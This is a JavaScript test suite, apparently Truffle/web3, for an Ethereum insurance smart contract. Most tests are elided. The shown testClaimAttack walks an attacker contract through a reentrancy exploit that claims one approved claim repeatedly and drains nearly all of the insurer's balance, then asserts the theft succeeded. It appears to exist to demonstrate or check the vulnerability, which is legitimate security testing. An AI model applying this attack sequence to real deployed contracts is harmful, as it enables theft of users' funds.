...
module.exports = exports = {
    testBasicTimestamps: async function(insurance) {
    ...
    testNonExistentAccess: async function(insurance) {
    ...
    testBasicPoliciesLifeProduct: async function(insurance) {
    ...
    testBasicPoliciesHomeProduct: async function(insurance) {    
    ...
    testBasicSinisters: async function(insurance) {
    ...
    testSinisterVotesAndClaims: async function(insurance) {
        await utils.setNowTimestamp(insurance, 1);
    ...
    testClaimAttack: async function(insurance, claimAttack) {
        // Initialize attacker's contract addresses
        await claimAttack.setInsuranceAddr(insurance.address, {from : utils.getPonzi()});
        // Start the execution at ts 1
        await utils.setNowTimestamp(insurance, 1);
        ...
        // Add attacker's policies
        await claimAttack.addReceipt(utils.getBoatsProduct(), { from: utils.getPonzi(), value: utils.getWei(5) });
        await insurance.addReceipt(utils.getBoatsProduct(), { from: utils.getMadoff(), value: utils.getWei(5) });
        
        // Assert that policies were created
        const policyPonzi = await insurance.getPolicyByOwnerAndProduct(utils.getBoatsProduct(), claimAttack.address);
        assert(policyPonzi[0] == true, "Failed to retrieve policy");

        const policyMadoff = await insurance.getPolicyByOwnerAndProduct(utils.getBoatsProduct(), utils.getMadoff());
        assert(policyMadoff[0] == true, "Failed to retrieve policy");

        // Advance timestamp and declare sinisters
        await utils.setNowTimestamp(insurance, 3);
        await claimAttack.declareSinister(policyPonzi[1].id, "A mysterious sinister", 2, utils.getWei(1), "http://images.com/sinisterImage", 550, { from: utils.getPonzi() });
        const activeSinisters = await utils.getActiveSinistersByProduct(insurance, utils.getBoatsProduct(),3);
        const sin_ponzi = activeSinisters[0].id;

        // Declare another sinister just in case active funds are checked
        await insurance.declareSinister(policyMadoff[1].id, "Another mysterious sinister", 2, utils.getWei(24), "http://images.com/sinisterImage", 550, { from: utils.getMadoff() });
        
        // Vote for the sinister
        await insurance.voteSinister(sin_ponzi, 1, { from: utils.getMadoff() })

        // Finish sinister voting phase
        await utils.setNowTimestamp(insurance, utils.getWeekSeconds() * 2);

        // Set attacker's contract target sinister id
        await claimAttack.setSinisterId(sin_ponzi, { from: utils.getPonzi() });
        // Set amount to steal
        const balanceInsurance = await web3.eth.getBalance(insurance.address);
        const toSteal = utils.getEther(balanceInsurance) - 5;
        await claimAttack.setStealAmount(toSteal, { from: utils.getPonzi() });

        // Reentrancy attack. Claim the sinister multiple times until target funds are adquired
        await claimAttack.claimSinister(sin_ponzi, { from: utils.getPonzi() });

        // Transfer the funds back to the attacker's address
        let balanceBefore = await web3.eth.getBalance(utils.getPonzi());
        await claimAttack.transferFunds({ from: utils.getPonzi() });
        let balanceAfter = await web3.eth.getBalance(utils.getPonzi());
        
        assert(balanceAfter - balanceBefore > utils.getWei(toSteal - 0.2), "Ponzi attack did not work");
    }
